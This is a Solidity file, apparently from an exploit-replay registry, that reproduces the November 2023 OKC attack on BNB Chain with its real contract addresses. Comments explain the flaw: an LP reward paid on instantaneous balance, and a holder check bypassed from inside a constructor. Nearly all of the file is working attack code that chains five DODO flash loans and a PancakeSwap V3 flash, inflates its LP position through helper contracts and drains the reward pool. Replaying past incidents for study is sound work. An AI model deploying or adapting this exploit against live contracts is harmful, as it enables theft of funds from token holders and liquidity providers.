// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./../interface.sol";

// OKC (BSC, Nov 2023) — permissionless MinerPool.processLPReward() pays OKC
// proportional to the caller's INSTANTANEOUS LP balance, with no snapshot or
// holding period. The only sybil guard on LPRewardProcessor.addHolder()
// (an extcodesize check) is bypassed by registering a holder from inside its
// own constructor (extcodesize(self) == 0 mid-construction).
//
// This is a cheatcode-free, logging-free copy of the registry's
// test/OKC_exp.sol AttackContract/AttackContract2 (the original AttackContract
// already has zero Foundry cheatcode dependency — only its wrapping
// ContractTest.setUp()/testExploit() use vm.* cheatcodes, none of which affect
// the attack path). This copy exists ONLY to drop the many console2.log calls
// and diagnostic-only extcodesize/assert lines, which push the compiled
// AttackContract past the EIP-170 24576-byte contract-size limit this replay
// engine enforces (the on-chain deployed bytecode never had them either —
// they are Foundry-trace-only instrumentation, not part of the exploit logic).
//
// @Analysis
// https://lunaray.medium.com/okc-project-hack-analysis-0907312f519b
// @TX
// https://dashboard.tenderly.co/tx/bnb/0xd85c603f71bb84437bc69b21d785f982f7630355573566fa365dbee4cd236f08

contract AttackContract is IDODOCallee {
    uint256 public nonce = 1;
    AttackContract2 public attack_contract1;
    AttackContract2 public attack_contract2;

    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
    address payable public minerPool = payable(address(0x36016C4F0E0177861E6377f73C380c70138E13EE));

    IDPPOracle public DPP1 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IDPPOracle public DPP2 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle public DPP3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle public DPP4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle public DPP5 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IPancakeV3Pool public pancakeV3Pool = IPancakeV3Pool(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    IPancakeRouter public pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair public pancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);

    function approveAll() internal {
        OKC.approve(address(pancakeRouter), type(uint256).max);
        pancakePair_USDT_OKC.approve(address(pancakeRouter), type(uint256).max);
    }

    function expect1() external payable {
        approveAll();

        uint256 amount = USDT.balanceOf(address(DPP1));
        DPP1.flashLoan(0, amount, address(this), "0");
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (keccak256(data) == keccak256(bytes("0"))) {
            uint256 amount = USDT.balanceOf(address(DPP2));
            DPP2.flashLoan(0, amount, address(this), "1");
            USDT.transfer(address(DPP1), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("1"))) {
            uint256 amount = USDT.balanceOf(address(DPP3));
            DPP3.flashLoan(0, amount, address(this), "2");
            USDT.transfer(address(DPP2), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("2"))) {
            uint256 amount = USDT.balanceOf(address(DPP4));
            DPP4.flashLoan(0, amount, address(this), "3");
            USDT.transfer(address(DPP3), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("3"))) {
            uint256 amount = USDT.balanceOf(address(DPP5));
            DPP5.flashLoan(0, amount, address(this), "4");
            USDT.transfer(address(DPP4), quoteAmount);
        } else if (keccak256(data) == keccak256(bytes("4"))) {
            pancakeV3Pool.flash(
                address(this),
                2_500_000_000_000_000_000_000_000,
                0,
                abi.encodePacked(uint256(2_500_000_000_000_000_000_000_000))
            );
            USDT.transfer(address(DPP5), quoteAmount);
        }
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        uint256 amount_flash = abi.decode(data, (uint256));

        swap();
        mint();
        USDT.transfer(address(pancakeV3Pool), amount_flash + fee0);
    }

    function swap() private {
        address[] memory a = new address[](2);
        a[0] = address(USDT);
        a[1] = address(OKC);

        pancakeRouter.getAmountsOut(130_000_000_000_000_000_000_000, a);
        pancakePair_USDT_OKC.swap(
            1, 28_108_225_547_221_109_324_317, address(this), abi.encodePacked(uint256(130_000_000_000_000_000_000_000))
        );
    }

    function mint() private {
        address new_attack_contract1 = calculateAddress(address(this), nonce);
        OKC.transfer(address(new_attack_contract1), 10_000_000_000_000_000);
        attack_contract1 = new AttackContract2();
        nonce++;

        address new_attack_contract2 = calculateAddress(address(this), nonce);
        USDT.transfer(address(new_attack_contract2), 100_000_000_000_000);
        OKC.transfer(address(new_attack_contract2), 1);
        attack_contract2 = new AttackContract2();

        (uint112 reserve0, uint112 reserve1,) = pancakePair_USDT_OKC.getReserves();
        uint256 okc_amount3 = OKC.balanceOf(address(this));

        uint256 amountb = pancakeRouter.quote(okc_amount3, reserve1, reserve0);
        USDT.transfer(address(pancakePair_USDT_OKC), amountb);

        uint256 okc_amount4 = OKC.balanceOf(address(this));
        OKC.transfer(address(pancakePair_USDT_OKC), okc_amount4);

        pancakePair_USDT_OKC.mint(address(this));

        uint256 lp_amount1 = pancakePair_USDT_OKC.balanceOf(address(this));
        pancakePair_USDT_OKC.transfer(address(attack_contract2), lp_amount1);

        // Main attack point: trigger the permissionless, unlocked reward payout.
        minerPool.call(abi.encodeWithSignature("processLPReward()"));

        attack_contract2.transfer_all(address(pancakePair_USDT_OKC), address(this));

        uint256 lp_amount2 = pancakePair_USDT_OKC.balanceOf(address(this));
        pancakeRouter.removeLiquidity(
            address(OKC), address(USDT), lp_amount2, 0, 0, address(this), block.timestamp + 1000
        );

        attack_contract1.transfer_all(address(OKC), address(this));
        attack_contract2.transfer_all(address(OKC), address(this));

        uint256 okc_amount5 = OKC.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = address(OKC);
        path[1] = address(USDT);

        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            okc_amount5, 0, path, address(this), block.timestamp + 1000
        );
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 amount = abi.decode(data, (uint256));
        USDT.transfer(address(pancakePair_USDT_OKC), amount);
    }

    function calculateAddress(address creator, uint256 nonce_) public pure returns (address) {
        bytes memory data;
        if (nonce_ == 0x00) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, bytes1(0x80));
        } else if (nonce_ <= 0x7f) {
            data = abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator, uint8(nonce_));
        } else if (nonce_ <= 0xff) {
            data = abi.encodePacked(bytes1(0xd7), bytes1(0x94), creator, bytes1(0x81), uint8(nonce_));
        } else if (nonce_ <= 0xffff) {
            data = abi.encodePacked(bytes1(0xd8), bytes1(0x94), creator, bytes1(0x82), uint16(nonce_));
        } else if (nonce_ <= 0xffffff) {
            data = abi.encodePacked(bytes1(0xd9), bytes1(0x94), creator, bytes1(0x83), uint24(nonce_));
        } else {
            data = abi.encodePacked(bytes1(0xda), bytes1(0x94), creator, bytes1(0x84), uint32(nonce_));
        }
        return address(uint160(uint256(keccak256(data))));
    }
}

contract AttackContract2 {
    IERC20 public USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 public OKC = IERC20(0xABba891c633Fb27f8aa656EA6244dEDb15153fE0);
    IPancakePair public PancakePair_USDT_OKC = IPancakePair(0x9CC7283d8F8b92654e6097acA2acB9655fD5ED96);

    constructor() {
        // Registered as an OKC LP-reward holder HERE: this transfer triggers
        // OKC._transfer's add-liquidity hook -> LPRewardProcessor.addHolder(self).
        // extcodesize(self) == 0 while still mid-construction, bypassing the
        // only guard meant to block contract holders.
        uint256 amount = USDT.balanceOf(address(this));
        USDT.transfer(address(PancakePair_USDT_OKC), amount);
        uint256 amount2 = OKC.balanceOf(address(this));
        OKC.transfer(address(PancakePair_USDT_OKC), amount2);
    }

    function transfer_all(address token, address to) public returns (uint256) {
        uint256 amount = IERC20(token).balanceOf(address(this));
        if (IERC20(token).transfer(to, amount)) {
            return amount;
        } else {
            revert("transfer error");
        }
    }
}
